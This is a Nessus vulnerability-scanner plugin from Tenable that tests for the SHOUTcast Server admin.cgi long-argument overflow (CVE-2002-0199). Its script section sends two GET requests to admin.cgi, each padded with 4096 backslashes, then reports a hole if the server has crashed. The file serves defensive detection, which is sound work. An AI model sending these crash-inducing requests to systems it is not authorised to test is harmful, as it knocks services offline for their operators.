#
# (C) Tenable Network Security, Inc.
#

# References:
# Date:  Mon, 21 Jan 2002 22:04:58 -0800
# From: "Austin Ensminger" <skream@pacbell.net>
# Subject: Re: Shoutcast server 1.8.3 win32
# To: bugtraq@securityfocus.com
#
# Date:  19 Jan 2002 18:16:49 -0000
# From: "Brian Dittmer" <bditt@columbus.rr.com>
# To: bugtraq@securityfocus.com
# Subject: Shoutcast server 1.8.3 win32
#

include("compat.inc");

if (description)
{
  script_id(11719);
  script_version("$Revision: 1.28 $");
  script_cvs_date("$Date: 2016/11/03 21:08:35 $");

  script_cve_id("CVE-2002-0199");
  script_bugtraq_id(3934);
  script_osvdb_id(14300);

  script_name(english:"SHOUTcast Server admin.cgi Long Argument Overflow");
  script_summary(english:"Overflows admin.cgi");

  script_set_attribute(attribute:"synopsis", value:
"The remote streaming audio server is vulnerable a buffer overflow
attack.");
  script_set_attribute(attribute:"description", value:
"The remote SHOUTcast Server crashes when an overly large number of
backslashes is passed as an argument to its 'admin.cgi' script.  An
unauthenticated, remote attacker can leverage this issue to crash the
affected service or possibly even execute arbitrary code on the affected
host.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2002/Jan/255");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/06/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:nullsoft:shoutcast_server");
  script_end_attributes();

  script_category(ACT_DENIAL);

  script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
  script_family(english:"CGI abuses");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 8888);
  # Shoutcast is often on a high port
  exit(0);
}

# The script code starts here

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default: 8888, embedded: 0);
if (http_is_dead(port: port)) exit(1, "The web server on port "+port+" is already dead");

banner = get_http_banner(port:port);
if (! banner) exit(1, "No HTTP banner on port "+port);
if ("shoutcast" >!< tolower(banner) )
  exit(0, "The web server on port "+port+" is not Shoutcast");


u = strcat("/admin.cgi?pass=", crap(length:4096, data:"\"));
w = http_send_recv3(method:"GET", item: u, port:port);

u = strcat("/admin.cgi?", crap(length:4096, data:"\"));
w = http_send_recv3(method:"GET", item: u, port:port);

if (http_is_dead(port: port))
  {
   security_hole(port: port);
   exit(0);
  }

